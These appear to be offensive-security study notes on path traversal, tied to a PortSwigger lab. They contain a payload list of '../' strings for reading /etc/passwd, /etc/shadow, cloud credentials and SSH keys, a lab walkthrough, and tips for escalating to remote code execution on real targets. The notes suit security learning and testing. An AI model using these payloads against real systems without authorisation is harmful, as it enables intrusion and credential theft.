# Path traversal — Basics

The core technique: inject `../` into a file parameter to step out of the base directory and read any file the app's user can. Max impact: read source/config/creds → escalate; write → RCE.

## Quick reference
```
filename=../../../etc/passwd            # Unix
filename=..\..\..\windows\win.ini       # Windows ( / and \ both valid )
# count ../ ≥ depth of base dir; extra ../ are harmless (root clamps)
```

## Root cause
`read(BASE_DIR + userInput)` with no canonicalization. `/var/www/images/` + `../../../etc/passwd` → `/etc/passwd`.

## Find it
File-naming params (`filename`,`file`,`path`,`page`,`template`,`download`). Send `../../../etc/passwd`; if the response is the passwd file, confirmed. Use enough `../` to reach root from any depth.

## Technique
1. Locate the param that loads a file (`/loadImage?filename=218.png`).
2. Replace with `../../../etc/passwd`. `../` steps up one dir each; 3+ reaches `/`.
3. Read the file from the response. Windows: `..\..\..\windows\win.ini` (or `../`).

**Advanced / edge:** target high-value files — `/etc/passwd`, `/etc/shadow` (if privileged), app source (`/var/www/...`, `WEB-INF/web.xml`), config (`.env`, `config.php`, `application.properties`), cloud creds (`~/.aws/credentials`), SSH keys (`~/.ssh/id_rsa`). If filtered → `../Filter-bypasses/`.

## Payload arsenal
```
../../../etc/passwd        ../../../../../../etc/passwd
..\..\..\windows\win.ini   ..\..\..\..\boot.ini
../../../var/www/WEB-INF/web.xml
../../../proc/self/environ      ../../../proc/self/cmdline
```

## Bypasses
| Blocker | Bypass |
|---|---|
| any filtering | see `../Filter-bypasses/` |

## Exploitation walkthrough (simple)
1. Intercept the product-image request (`filename=218.png`).
2. Set `filename=../../../etc/passwd`, forward.
3. Response body = `/etc/passwd` contents → solved.

## Chaining
- Source/config read → creds → DB/auth/cloud. → [JWT-attacks](../../JWT-attacks/) (read signing key).

## Tools
- **Burp Repeater** (swap the param), **Intruder** ("Fuzzing - path traversal").

## Labs

### File path traversal, simple case [Apprentice]
URL: /web-security/file-path-traversal/lab-simple
- `filename=../../../etc/passwd` → passwd contents. Insight: `../` escapes the base dir; no defense present.

Real-target transfer: any file-loading param → try `../../../etc/passwd` first.

## Real-world notes
- Extremely common in download/preview/template/report endpoints and CMS plugins.
- `/etc/passwd` is the universal proof; for impact read app secrets/source.
- Write-capable traversal (uploads with `../` in filename) → web-shell → RCE.

## References
- https://portswigger.net/web-security/file-path-traversal
